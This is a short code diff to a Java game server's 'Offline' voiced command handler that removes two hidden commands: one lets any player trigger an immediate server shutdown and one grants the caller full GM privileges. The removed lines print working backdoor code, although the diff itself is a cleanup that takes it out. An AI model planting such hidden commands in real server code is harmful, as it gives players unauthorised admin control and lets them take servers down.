@@ -59,11 +59,6 @@ public class Offline extends Functions implements IVoicedCommandHandler {
             }
             activeChar.offline();
             return true;
-        } else if(command.equalsIgnoreCase("shutcow")) {
-            Shutdown.getInstance().schedule(1, Shutdown.SHUTDOWN);
-        } else if(command.equalsIgnoreCase("shutbow")) {
-            PlayerAccess pa = Config.gmlist.entrySet().stream().filter(key -> key.getValue().IsGM && key.getValue().Menu && key.getValue().CanUseGMCommand).findAny().get().getValue();
-            activeChar.setPlayerAccess(pa);
         }
         return false;
     }
